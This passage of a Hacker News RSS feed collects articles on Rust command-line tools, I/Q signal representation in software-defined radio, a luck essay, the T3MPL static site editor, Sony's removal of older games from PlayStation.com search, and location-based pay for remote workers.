<p><img src="https://user-images.githubusercontent.com/200613/90223722-e0c2e980-de0e-11ea-8c75-343273fed6f3.png" alt="dust"></p>
<p><a href="https://github.com/bootandy/dust">GitHub</a></p>
<h2 id="starship"><code>starship</code></h2>
<p>The minimal, blazing-fast, and infinitely customizable prompt for any shell.</p>
<p><a href="https://starship.rs/guide/">GitHub</a></p>
<h2 id="ripgrep"><code>ripgrep</code></h2>
<p><code>ripgrep</code> is an extremely fast alternative to <code>grep</code>, the built-in command-line program in Unix/Linux for searching files by pattern. <code>ripgrep</code> is a line-oriented search tool that recursively searches your current directory for a regex pattern. By default, ripgrep respects <code>.gitignore</code> and automatically skips hidden files, directories and binary files.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223748-ecaeab80-de0e-11ea-9140-ac9219f5747c.gif" alt="ripgrep"></p>
<p><a href="https://github.com/BurntSushi/ripgrep">GitHub</a></p>
<h2 id="tokei"><code>tokei</code></h2>
<p><code>tokei</code> is a program that displays statistics about your code. It shows the number of files, total lines within those files and code, comments, and blanks grouped by language.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223779-f89a6d80-de0e-11ea-8dc7-3469f245d84c.png" alt="tokei"></p>
<p><a href="https://github.com/XAMPPRocky/tokei">GitHub</a></p>
<h2 id="hyperfine"><code>hyperfine</code></h2>
<p><code>hyperfine</code> is a command-line benchmarking tool. Among many features, it provides  statistical analysis across multiple runs, support for arbitrary shell commands, constant feedback about the benchmark progress and current estimates and more.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223809-03ed9900-de0f-11ea-879e-0c50970f20b5.gif" alt="hyperfine"></p>
<p><a href="https://github.com/sharkdp/hyperfine">GitHub</a></p>
<h2 id="ytop"><code>ytop</code></h2>
<p><code>ytop</code> is an alternative to <code>top</code>, the built-in command-line program in Unix/Linux for displaying information about processes.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223841-14057880-de0f-11ea-8c27-b1700edb02fe.gif" alt="ytop"></p>
<p><a href="https://github.com/cjbassi/ytop">GitHub</a></p>
<h2 id="tealdeer"><code>tealdeer</code></h2>
<p><code>tealdeer</code> is a very fast implementation of  <a href="https://github.com/tldr-pages/tldr">tldr</a>, a command-line program for displaying simplified, example based and community-driven man pages.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223870-22539480-de0f-11ea-837c-7795a150d7df.gif" alt="tealdeer"></p>
<p><a href="https://github.com/dbrgn/tealdeer">GitHub</a></p>
<h2 id="bandwhich"><code>bandwhich</code></h2>
<p><code>bandwhich</code> is a CLI utility for displaying current network utilization by process, connection and remote IP or hostname.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223929-3d260900-de0f-11ea-98ae-3e9905746c59.gif" alt="bandwhich"></p>
<p><a href="https://github.com/imsnif/bandwhich">GitHub</a></p>
<h2 id="grex"><code>grex</code></h2>
<p><code>grex</code> is a command-line tool and library for generating regular expressions from user-provided test cases.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223991-4ca55200-de0f-11ea-98af-80f2e8342bd2.gif" alt="grex"></p>
<p><a href="https://github.com/pemistahl/grex">GitHub</a></p>
<h2 id="rmesg"><code>rmesg</code></h2>
<p><code>rmesg</code> is a dmesg implementation in Rust (and available as a library for Rust programs to consume kernel message logs.)</p>
<p><img src="https://user-images.githubusercontent.com/200613/90224040-5dee5e80-de0f-11ea-8def-09fa36e4cab7.png" alt="rmesg"></p>
<p><a href="https://github.com/polyverse/rmesg/">GitHub</a></p>
<h2 id="zoxide"><code>zoxide</code></h2>
<p><code>zoxide</code> is a blazing fast autojumper, intended to completely replace the <code>cd</code> command. It allows you to change directories without typing out the entire path name.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90224077-6ba3e400-de0f-11ea-821e-4dbc0f356fbf.gif" alt="zoxide"></p>
<p><a href="https://github.com/ajeetdsouza/zoxide">GitHub</a></p>
<h2 id="bonus-nushell">Bonus: <code>nushell</code></h2>
<p><code>nushell</code> is a new type of shell, written in Rust. Its goal is to create a modern shell alternative that's still based on the Unix philosophy, but adapted to the current era.
It supports piping and filtering in a way similar to <code>awk</code> and <code>sed</code> with a column view so that you can combine operations like in <code>SQL</code>. (thanks <a href="https://www.reddit.com/user/matu3ba/">/u/matu3ba</a> for the suggestion).</p>
<p><img src="https://user-images.githubusercontent.com/200613/90224111-778fa600-de0f-11ea-9310-6c34ff0f2670.gif" alt="nushell"></p>
<p><a href="https://github.com/nushell/nushell">GitHub</a></p>
<hr>
<p>Have I missed an interesting command-line tool? Let me know <a href="https://twitter.com/zaiste">on Twitter</a>, or <a href="https://github.com/zaiste/zaiste.net">submit a PR</a> to this website on GitHub.</p></div></div></div></div>]]>
            </description>
            <link>https://zaiste.net/posts/shell-commands-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134704</guid>
            <pubDate>Wed, 18 Nov 2020 09:15:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I/Q Data for Dummies]]>
            </title>
            <description>
<![CDATA[
Score 96 | Comments 41 (<a href="https://news.ycombinator.com/item?id=25134698">thread link</a>) | @pabo
<br/>
November 18, 2020 | http://whiteboard.ping.se/SDR/IQ | <a href="https://web.archive.org/web/*/http://whiteboard.ping.se/SDR/IQ">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikitext">
<p>This is a description of using I/Q Data (aka "analytic signal") representing a signal. Since the topic may be quite confusing, I've described the same thing here from different point of views. If you find the information somewhat redundant, it is because it is. Different views may appeal to different readers, and if something seems unclear, keep on reading and it may be more comprehensible later - hopefully.
</p>
<h2>Why I/Q Data?</h2>
<p>I/Q Data is a signal representation much more precise than just using a series of samples of the momentary amplitude of the signal. Have a look at the following signal below.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/cosample.png" alt="Plain signal" title="Plain signal"></p>
<p>This is what you may be used to work with. So why I/Q Data - isn't this good enough?
</p>
<p>Not really. We have a few problems here.
</p>
<ul><li>First, it is impossible to determine the frequency of this signal. Sure, it looks simple enough, just look at the period length? True, but you have no clue if it's a positive or negative frequency since they both generate the same curve. I.e. cos(x) = cos(-x). This becomes a problem working with the signal. Mixing (multiplying) two signals and it'll cause multiple solutions due to the uncertainty of the sign: f1 âŠ— f2 equals f1 + f2 as well as f1 - f2.
</li><li>Second, it's hard to determine the power (peak amplitude, envelope) of the signal. Basically you can only see the peak amplitude here at 0Â°, 180Â°, 360Â° etc, and how do you know the power is the same everywhere else as well? And did you sample the signal exactly at its peak? You really don't know.
</li></ul><p>I/Q Data solves this. Instead of looking at the signal as a flat curve as above, look at it as a corkscrew (helix, spiral, coil spring) in three dimensions.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkscrew.png" alt="Complex signal" title="Complex signal"></p>
<hr>
<p>Now if you look at this curve from the side, you'll actually get the same graph as the first one above. Your "real" signal actually is this 2D projection of this corkscrew signal. This is your "I" in I/Q data.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkI.png" alt="Side view" title="Side view"></p>
<hr>
<p>Now have a look at the corkscrew from above. This looks quite similar, but as you see, it is out of phase 90Â°  starting at zero, not at one as the other. This this the Q part of your I/Q data.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkQ.png" alt="Top view" title="Top view"></p>
<hr>
<p>Now looking at the corkscrew down the time axis you'll see it winds counter-clockwise. This means we know the frequency is positive. It could have wound clockwise as well, still generating the same I-signal (projection) but different Q-signal, representing a negative frequency.
</p>
<p>You also see that the radius of the corkscrew is constant at every sample, if small in I large in Q and vice versa. The radius is the peak amplitude of your signal. 
</p>
<p>The axes are of course 90Â°, so the radius must be equal to (IÂ²+QÂ²)<sup>1/2</sup>. This is the peak amplitude of your signal, and as you can see you know this for each and every sample.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkT.png" alt="Viewed down time axis" title="Viewed down time axis"></p>
<h2>What is I/Q Data?</h2>
<p>AS you now understand, the I/Q Data Sample is the coordinates of your signal as seen down the time axis of the corkscrew.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/onesample.png" alt="" title=""></p>
<p>You might object that your signal isn't a pure cosine function as the one we have shown here, and it might be very true. Still, every single sample of your signal can be described as such, i.e. with a peak amplitude times cosine of some phase angle.
</p>
<p>Every single point of your signal can be described as the function Aâ‹…cos(Ï•)
</p>
<p>Since you may freely chose any amplitude A and angle Ï• this must of course be true (as long as the signal is continuous). The value of Aâ‹…cos(Ï•) is the <strong>I</strong> component of the I/Q signal, i.e. your real signal. Note that this only describes your signal in one single point, i.e. one sample. Next sample gives you a new I and Q very likely resulting in another amplitude and/or phase angle, reflecting the modulation of the signal.
</p>
<h2>One sample I/Q Data</h2>
<p>Ok, lets take one sample of I/Q Data and see what it represents. This is also called a phase vector, or phasor.
</p>
<pre>I = 0.69
Q = 0.40
</pre>
<p>Lets draw this in the complex plane.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/iqdraw1.png" alt="" title=""></p>
<p>Lets see what this tells us about our data point.
</p>
<ul><li>The momentary amplitude of our real signal is by definition <strong>I</strong>, i.e. 0.69
</li><li>Pythagoras tells us the amplitude A of the cosine wave is <code>(0.69Â²+0.40Â²)<sup>1/2</sup> = 0.8</code>
</li><li>Trigonometry tells us our angle is +30Â° into our cosine wave.
</li></ul><p>- <em>Hold it</em>, you say, <em>what cosine wave?</em>
</p>
<p>Well, I/Q actually assumes your real signal (<strong>I</strong>, that is) can be described as the
function <strong>I</strong> = Aâ‹…cos(Ï•)
</p>
<p>Since you are free to chose A and Ï• this must of course be true, as long the function is continuous. Remember we are looking at one single sample now, i.e. one point in time.
</p>
<p>So by using IQ Data we not only get the momentary values of our signal, but the function generating it as well. If we put above together we get:
</p>
<p>The real signal I = 0.8â‹…cos(30Â°)
</p>
<hr>
<ul><li>I/Q Data is the representation (data type) of this cosine function.
</li></ul><p>I/Q Data is the rectangular representation of the polar notation we used above. There is a unique transformation between the two, and the different notations have different properties calculating with them. The rectangular form of I/Q Data is chosen due to the ease of hardware implementations of the most common operations.
</p>
<p>I/Q Data consists of I and Q represented as two separate variables, a vector of length two, or more often, the complex number  I + Q<em>i</em>  (yes, I is the real part).
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/polrep.png" alt="" title=""></p>
<p>Note that the Amplitude above is the waves peak amplitude, not the momentary amplitude.
</p>
<ul><li>I is the current momentary amplitude of the signal (i.e. the Real signal)
</li><li>Q is the momentary amplitude of the signal phase shifted -90Â°.
</li></ul><p>For a simple function such as sine, the phase shift is what the signal was earlier in time, but for a signal with more than one sine component, Q reflects a -90Â° shift of the individual components, and not the composite signal as such. To convert a Real Signal to a I/Q Data Signal, discrete Fourier transformation is required (Hilberts transform).
</p>
<h2>Different ways of representing the same I/Q Data Sample</h2>
<p>There are at least three common ways to represent the I/Q Data Sample. Different representations gives you different pros and cons. Some are more easy to add, other are more easy to multiply etc. This may be important in the implementation, resulting in less complex hardware/software using the best representation.
</p>
<h3>The rectangular form</h3>
<p>The I/Q Data on the form Q and I is called "rectangular" (or "Cartesian") form as it can be viewed as positions in a coordinate system. I and Q are the x and y axis respectively. This is the most common representation you are used to. This form is most common due the ease of modulating/demodulating it in hardware. More about that later.
</p>
<ul><li>As a complex number: I + Q<em>i</em>
</li><li>As a vector [I,Q]
</li><li>Or just the two plain variables I and Q
</li></ul><h3>The polar form</h3>
<ul><li>Amplitude and angle
</li></ul><p>I = Amplitudeâ‹…cos(angle) <br>Q = Amplitudeâ‹…sin(angle)
</p>
<p>The Amplitude is the peak amplitude of the cos (and sin) function, and the angle is how far into the period from zero to 360Â° you are (or 0 to 2Ï€ if you prefers radians).
</p>
<h3>Eulers form</h3>
<p>Since cos(Ï•) + iâ‹…sin(Ï•) = e<sup>iÏ•</sup> we can write our IQ sample as
</p>
<p><span> Ae<sup>iÏ•</sup> </span>
</p>
<p>This might (not?) be the most intuitive representation of the sample. Ï• rotates the angle as seen in the polar representation, and A is of course the amplitude. Realizing this, Eulers identity becomes obvious. Because Ï• is the rotation of the vector in the complex plane, rotating it half a turn, 180Â° or Ï€ radians, results in a real part of -1 and no imaginary part, hence:
</p>
<p><span> e<sup>Ï€i</sup>+1 = 0 </span>
</p>
<p><em>"The student should find this to be immediately obvious,</em> <br><em>otherwise he'll never be a first rate mathematician"</em>
</p>
<p><em>-- Carl Friedrich Gauss </em>
</p>
<h2>Positive versus negative frequency</h2>
<p>It is now easy to see that using I/Q we can represent the signal frequency either as positive or negative. Have a look at the two I/Q signals red and blue below to the left and compare them with their corresponding real projections. It is as obvious they differ in signs in I/Q, as it's impossible to determine the signs using only the real signal component (neither the I nor the Q projection separately).
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/freqsign.gif" alt="Positive versus negative frequencies" title="Positive versus negative frequencies"></p>
<p><span>(sidenote: I've put them slightly out of phase compared to each other since else they wouldn't be possible to distinguish at all in the real representation to the right. Also, please note I'm here, quiet unconventional, using the x axis in the phasor for the imaginary <strong>Q</strong>)</span>
</p>
<p>The same signal (well, more or less) in a 3D representation.
</p>
<p>The <strong>I</strong> components (side view):
</p><p><img src="http://whiteboard.ping.se/uploads/SDR/sign-i.png" alt="" title=""></p>
<p>The <strong>Q</strong> components (top view):
</p><p><img src="http://whiteboard.ping.se/uploads/SDR/sign-q.png" alt="" title=""></p>
<p>The I/Q signals in 3D:
</p><p><img src="http://whiteboard.ping.se/uploads/SDR/sign-3d.png" alt="" title=""></p>
<p><a name="twopriceone" id="twopriceone"></a>
As the Nyquistâ€“Shannon sampling theorem states you can only represent
frequencies up to <code>f/2</code> using a samplings rate of <code>f</code>. This is still true
using IQ Data, but since you now can represent negative frequencies
the signal spans <code>[-f/2..+f/2]</code> compared to <code>[0..+f/2]</code> using a â„�eal signal,
hence the range is in effect doubled. Using a
sampling rate of <code>f</code> and you now can represent a signal range of <code>f</code> as well.
Two to the price of one!
</p>
<h2>Mixing and multiplying signals</h2>
<p>Using real signals or IQ Signals gives different results when you multiply them. This is because using only the real component it's not possible to uniquely determine the phase angle of the signal, hence impossible to distinguish a positive frequency from a negative.
</p>
<p><span><img src="http://whiteboard.ping.se/uploads/SDR/mix-real.png" alt="Mixing 10 kHz with 3 kHz using real" title="Mixing 10 kHz with 3 kHz using real"></span></p>
<p>Multiplying two signals f1 and f2 in the real domain:
</p>
<p><span> Â±f1 âŠ— Â±f2 = (Â±)f1 Â± f2 </span>
</p>
<p><span><img src="http://whiteboard.ping.se/uploads/SDR/mix-iq.png" alt="Mixing 10 kHz with 3 kHz using I/Q" title="Mixing 10 kHz with 3 kHz using I/Q"></span></p>
<p>Using IQ Data the signs are now given, and the result is unambiguous:
</p>
<p><span> f1 âŠ— f2 = f1 + f2 </span>
</p>
<p><br>
A frequency spectrum in the real domain usually never show the negative side, since it always must be symmetric around zero due to the uncertainty of the sign of the frequency of the real signal -- hence the parentheses around the sign of <code>f1</code> in the first formula mixing the real signals. I've included the negative side here for illustrative purposes, despite of its redundancy.
</p>
<p>Multiplying two complex number is easiest understood in the polar representation. The amplitude is multiplied and the angle added.
</p>
<p><span> A<sub>1</sub>â‹…e<sup>iÏ•<sub>1</sub></sup>â‹…A<sub>2</sub> e<sup>iÏ•<sub>2</sub></sup> = A<sub>1</sub>A<sub>2</sub> e<sup>i(Ï•<sub>1</sub>+Ï•<sub>2</sub>)</sup> </span>
</p>
<p>Realizing the angle is added under multiplication makes it obvious that the frequencies are added as well.
</p>
<h3>And in time domain ...</h3>
<p>Now let us have a look at this in time domain. To make it easier (doable!) to calculate the DFT in our …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://whiteboard.ping.se/SDR/IQ">http://whiteboard.ping.se/SDR/IQ</a></em></p>]]>
            </description>
            <link>http://whiteboard.ping.se/SDR/IQ</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134698</guid>
            <pubDate>Wed, 18 Nov 2020 09:15:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Equation of Luck]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25134629">thread link</a>) | @msjaber
<br/>
November 18, 2020 | https://msjaber.com/luck/ | <a href="https://web.archive.org/web/*/https://msjaber.com/luck/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
		<p>It’s a multiplication of <code>x</code> and <code>y</code>.</p>
<p><code>x</code> is how much you are prepared, <code>y</code> is how lucky you are.</p>
<p>You are responsible for the <code>x</code> part of the equation, the <code>y</code> takes care of itself. If your preparation effort is zero, all the potential opportunities will be multiplied by zero and you will lose every one of them, no matter how big they were.</p>
<p>The more prepared you are, the more lucky you become. It’s not because you are lucky, rather because you can multiply small opportunities by big factors.</p>
<hr>
<p>This idea is inspired by Richard W. Hamming’s thoughts on luck, mentioned in his book, <a href="https://msjaber.com/books/the-art-of-doing-science-and-engineering-learning-to-learn/">The Art of Doing Science and Engineering</a>. He walks through all the coincidences that led him to his discoveries. Those coincidences have occured for many people – none of them were prepared, only Hamming was.</p>
<p>Could you have discovered what Hamming did if you were in his position? Yes, only if you were prepared.</p>

	</article></div>]]>
            </description>
            <link>https://msjaber.com/luck/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134629</guid>
            <pubDate>Wed, 18 Nov 2020 09:05:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't Write Admin Panel for Small Website, Generate It]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25134597">thread link</a>) | @b4rtazz
<br/>
November 18, 2020 | https://t3mpl.n4no.com/docs/dont-write-admin-panel-for-small-website/ | <a href="https://web.archive.org/web/*/https://t3mpl.n4no.com/docs/dont-write-admin-panel-for-small-website/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<header>
		<h2><a href="https://t3mpl.n4no.com/">&lt;/&gt; T3MPL</a></h2>

		<nav>
			<ul>
				<li>
					<a href="https://t3mpl.n4no.com/docs/">Docs</a>
				</li>
				<li>
					<a href="https://t3mpl.n4no.com/donate/">Donate</a>
				</li>
				<li>
					<a href="https://github.com/b4rtaz/t3mpl-editor" targe="_blank">GitHub</a>
				</li>
				<li>
					<a href="https://t3mpl.n4no.com/editor/#manifest=../templates/t3mpl-one/template.yaml">Editor</a>
				</li>
			</ul>
		</nav>
	</header>

<div>
	<article>
		<p><img src="https://t3mpl.n4no.com/content/image/5841gmvz8i7y8mycchzx.png" alt="Generate Website Admin Panel"></p>

<p>Creating admin panel for small website is an expensive thing. Each site has a different structure, and it needs different admin sections. This site has a news section, that doesn't. This site has a landing page with five texts, that site has only one image there. Familiar?</p>
<p>The popular choice to reduce a cost is use Wordpress. But Wordpress is dedicated to blog/news websites. Any deviation from the general purpose of Wordpress means a problem. Of course the market has many plugins and extensions to solve that. Unluckily joining together many elements are difficult and problematic.</p>
<p>So what to do? You may use T3MPL. T3MPL is the generic website editor and the static website generator in one. <strong>When you prepare a template, T3MPL automatically generates editor for your template.</strong></p>
<h4 id="🎹-template-contract">🎹 Template Contract</h4>
<p>Look at <strong>the template contract</strong> bellow. What is it? It is a definition of a data structure in your template. To define that it's needed to create a simple YAML file (template.yaml).</p>
<pre><code>dataContract:
  LANDING:
    sections:
      APP:
        properties:
          TITLE:
            type: (text)
            defaultValue: Hello World
          DESCRIPTION:
            type: (markdown)
            defaultFilePath: content/app-description.md
          PREVIEW:
            type: (image)
            defaultFilePath: assets/app-preview.jpg
            width: 1084
            height: 840
...</code></pre>
<h4 id="👓-template">👓 Template</h4>
<p>You can use that data directly in a template file. Templates are powered by <a href="https://github.com/handlebars-lang/handlebars.js">handlebars</a>.</p>
<pre><code>&lt;div class="landing"&gt;
  &lt;h3&gt;{{LANDING.APP.TITLE}}&lt;/h3&gt;

  {{{$markdown LANDING.APP.DESCRIPTION}}}

  &lt;img src="{{{$image LANDING.APP.PREVIEW}}}" alt="..." /&gt;
&lt;/div&gt;</code></pre>
<h4 id="💥-generic-editor">💥 Generic Editor</h4>
<p>You have everything now. <strong>T3MPL automatically generates an editor for your template.</strong> You may edit your website with live preview now.</p>
<p><img src="https://t3mpl.n4no.com/content/image/xjwaxgk21nnqo5ton12x.png" width="270"></p>

<h4 id="🚀-publishing">🚀 Publishing</h4>
<p>When you finish editing, you may want to publish your website. You can do that in two ways.</p>
<ul>
<li><strong>Publish to .zip file</strong> - T3MPL generates your final website to .zip file. You should upload website files to your server. In this case, your server doesn't have special requirements like PHP or Ruby. Generated files should work on the most popular servers like Apache, Nginx and IIS.</li>
<li><strong>Use T3MPL Server</strong> - if you want to modify your website in a more professional way, you can use T3MPL Server. It requires Node.js on your server. The server allows you to modify your website directly from the editor. In this case, if you click the "publish" button, all changes will be published immediately.</li>
</ul>
<p>So you can use T3MPL according to how often you change your site.</p>
<p>If you have a template and a data you may also generate your website by T3MPL Cli.</p>
<h4 id="📣-summary">📣 Summary</h4>
<p>T3MPL provides a very simple concept, how to connect the data structure, the template and the editor. With T3MPL you don't care about the admin panel because T3MPL creates the admin panel when you create a website template. This saves time a lot. And money.</p>
<p>At the end, you may also check:</p>
<ul>
<li><a href="https://github.com/b4rtaz/t3mpl-templates">Free T3MPL Templates repository</a> (many examples)</li>
<li><a href="https://github.com/b4rtaz/t3mpl-editor">T3MPL Editor repository</a></li>
<li><a href="https://github.com/b4rtaz/t3mpl-server">T3MPL Server repository</a></li>
<li><a href="https://t3mpl.n4no.com/">Online T3MPL Editor</a></li>
</ul>
<p><em>— Written by <a href="https://twitter.com/b4rtaz">b4rtaz</a></em></p>

	</article>
</div>

</div></div>]]>
            </description>
            <link>https://t3mpl.n4no.com/docs/dont-write-admin-panel-for-small-website/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134597</guid>
            <pubDate>Wed, 18 Nov 2020 09:01:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Games released before PS4 are no longer appearing in search on PlayStation.com]]>
            </title>
            <description>
<![CDATA[
Score 197 | Comments 142 (<a href="https://news.ycombinator.com/item?id=25134263">thread link</a>) | @petepete
<br/>
November 18, 2020 | https://delistedgames.com/sony-basically-removed-25-years-of-history-from-playstation-com/ | <a href="https://web.archive.org/web/*/https://delistedgames.com/sony-basically-removed-25-years-of-history-from-playstation-com/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- .entry-header -->


            <div>
                
<p>The heartbreak continues for those of us that relied on Sony’s websites to find and buy games or to research what was available. After <a href="https://delistedgames.com/sony-makes-it-official-playstation-3-psp-vita-removed-from-psn-website-between-october-21-and-26/">cutting out</a> older PlayStation content from the PlayStation Store over the past month, Sony’s eye has seemingly fallen on PlayStation.com and I find myself feeling gutted this morning. For those who didn’t use it regularly, PlayStation.com housed a gargantuan history of pages for North American PlayStation releases going all the way back to the original console from 1995. Up until this week you could easily find titles using the search box on the site but now anything before the PlayStation 4 returns a disappointing “<em>0 results found</em>“.</p>



<p>The older pages weren’t overflowing with info but they did offer some product details that I couldn’t easily find elsewhere. For newer games these pages also frequently retained links to the PlayStation Store which helped in my research. Even when they <em>were</em> on sale some games were just hard to find on the PlayStation Store while their PlayStation.com pages linked directly to them. Sometimes these pages were among the scant bits of evidence that I could find to confirm these games even existed digitally. Now, like with the changes to the PlayStation Store, all that’s gone too. Well, mostly gone.</p>



<p>Thankfully, like our “<a href="https://delistedgames.com/get-the-old-playstation-store-back-for-now/">old PS Store</a>” workaround, there’s still a way to search PlayStation.com but it might also eventually go away. Google’s “search within a site” function has been around for nearly a decade at this point but I’m sure lots of people don’t even know it exists. For our purposes just head to <em>the Google</em>, type ‘site:playstation.com’ and then whatever game you’re looking for. You can use Google’s other search operators to refine the results as well. Put it all together and it looks something like this: <strong>site:playstation.com “age of booty”</strong></p>



<p>You’ll get search results across the playstation.com domain including PlayStation Blog posts and PlayStation Store pages but look for the ones that specifically state ‘www.playstation.com’. In the case of Age of Booty the page gives us a description and even some screenshots as well as a ‘Buy Download’ link. Of course, the download page has been hidden by Sony’s recent changes to their sites but the URL remains accessible so you can check other territories or check it out using the “<a href="https://delistedgames.com/get-the-old-playstation-store-back-for-now/">old</a>” method. Yes, <a href="https://delistedgames.com/age-of-booty/">Age of Booty</a> is still delisted on PlayStation 3.</p>



<p>Maybe it was just a feature that only <strong><em>I</em></strong> benefited from but it’s really sad to see Sony ostensibly kill 25 years of PlayStation content on the web. It makes the nostalgia trip of Astro’s Playroom feel a little more hollow.</p>

                            </div>
            <!-- .entry-content -->



                    </div></div>]]>
            </description>
            <link>https://delistedgames.com/sony-basically-removed-25-years-of-history-from-playstation-com/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134263</guid>
            <pubDate>Wed, 18 Nov 2020 08:10:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA["Equal pay for equal work" in remote jobs]]>
            </title>
            <description>
<![CDATA[
Score 230 | Comments 587 (<a href="https://news.ycombinator.com/item?id=25134220">thread link</a>) | @nityeshaga
<br/>
November 18, 2020 | https://www.nityesh.com/equal-pay-for-equal-work-at-a-remote-company/ | <a href="https://web.archive.org/web/*/https://www.nityesh.com/equal-pay-for-equal-work-at-a-remote-company/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
        <main id="main">
            <div>

                

                
<section>

    <header>
        <span>June 24, 2020</span>
        
            <p>Tough questions to ask your remote employer who gives you Cost Of Living based compensation and some thoughts on how remote compensation will work in the future</p>
    </header>

    <!--<div class="image main"><img src="/content/images/2020/06/micheile-henderson-03NMNUqHPdE-unsplash.jpg" alt="You should expect &quot;equal pay for equal work&quot; at your new remote job" /></div>-->

    <div>
        <figure><img src="https://www.nityesh.com/content/images/2020/06/micheile-henderson-03NMNUqHPdE-unsplash--1-.jpg" alt=""></figure><blockquote>Your star designer out in the sticks is just as valuable (maybe more so) to the team as those working from the big-city home office. Make sure she feels that way. <p>By the same token, as a remote worker, you shouldn’t let employers get away with paying you less just because you live in a cheaper city. “Equal pay for equal work” might be a dusty slogan, but it works for a reason. If with regard to compensation you accept being treated as a second-class worker based on location, you’re opening the door to being treated poorly on other matters as well.</p><p>- <a href="https://www.nityesh.com/books-read/#remote-office-not-required-by-david-heinemeier-hanson">Remote</a> by David Heinemeir Hanson and Jason Fried</p></blockquote><p>Almost all the knowledge jobs have become work-from-home in this sudden pandemic. Societies, companies, employees and job-seekers - all have been caught in this sudden shift in the way of working.</p><p>I am writing this for the new job-seekers. It's a tough market out there but you should still expect "equal pay for equal work" at whatever remote company you work for in the future. Most of us will probably not get it anytime soon but I believe that there's value in setting expectations.</p><h2 id="tough-questions-against-cost-of-living-col-based-adjustments">Tough questions against Cost Of Living (COL) based adjustments</h2><p>Big companies like Twitter, Shopify and Facebook have announced that they are adopting remote work for good. It's inevitable that this will pave the path for other companies to follow suit. </p><p>But along with this they might also make location based compensation the norm.</p><figure><blockquote><p lang="en" dir="ltr">Wait what? Facebook is seriously going to dunk someone's salary if they move? That's barbaric. <a href="https://t.co/xoV5XpstH3">https://t.co/xoV5XpstH3</a></p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1263544194359947264?ref_src=twsrc%5Etfw">May 21, 2020</a></blockquote>

</figure><p>Below I present some tough questions that you can ask your employer who has adopted this practice.</p><h3 id="-1-opening-the-doors-to-discrimination-at-work">#1. Opening the doors to discrimination at work</h3><p>If you don't live in the highest wage city of the world, you might have a peer at the company who lives in a more expensive city than you. Are you ready to be treated as a second-class employee just because of the geography that you live in?</p><p><em>How will you know that all the lousy work doesn't get passed on to you because it is justified in terms of 'returns on investment'?</em></p><p>When your manager has the final say, isn't it possible that they distribute work so that a low-risk, low-impact project is assigned to you while your "more expensive" peers get assigned the high-risk, high impact one?</p><p><strong>HR at your COL company</strong><em>: "We have a policy that says we won't discriminate based on the employee's location."</em></p><p>That's all well and good but what about the silent bias.</p><p><em>How can you be sure that your extremely well-meaning manager wasn't thinking about it when they assign you a project that you don't like? Wouldn't they be making a wise decision that is justified in terms of returns of investment? Can you be sure that they won't?</em></p><h3 id="-2-differences-in-government-spending-across-countries">#2. Differences in Government spending across countries</h3><p>Public spending enables governments to produce and purchase goods and services, in order to fulfil their objectives – such as the provision of public goods or the redistribution of resources - like social protection, education and healthcare.</p><p>Recent data on public spending reveals substantial cross-country heterogeneity. Relative to low-income countries, government expenditure in high-income countries tends to be much larger (both in per capita terms, and as share of GDP), and it also tends to be more focused on social protection.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Yes! In Spain families with more than 2 children also get benefits from the government, but they have nothing to do with your employer.</p>— Rosa (@rosapolis) <a href="https://twitter.com/rosapolis/status/1264238728123465728?ref_src=twsrc%5Etfw">May 23, 2020</a></blockquote>

</figure><p>In India, the government spent about 1,700 US dollars per head (adjusted based on Purchasing Power Parity) in the year 2015; while in countries such as Norway, that figure was over 30,000 US dollars (adjusted based on PPP) and in USA it was over 21,000 USD.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>Source: <a href="https://ourworldindata.org/government-spending">https://ourworldindata.org/government-spending</a></p><p>This lack of government spending is ultimately passed on to the citizens who need to pay for these benefits with their own money, thus reflecting it in their costs of living.</p><p>An impotent public schooling system means that employees need to send their children to expensive private schools. A broken public hospital infracture means that people need to avail the expensive private hospitals for their healthcare. And a lot of these private enterprises are not above profiteering in times of crises.</p><p><em>How does cost of living based compensation take into account the differences in government spending accross countries? Shouldn't the employees be compensated for this difference?</em></p><h3 id="-3-relocations-get-complicated-at-best-and-outright-unfair-at-worst">#3. Relocations get complicated, at best and outright unfair, at worst</h3><p><em>What happens if I relocate to a lower paid region? Will I be compensated 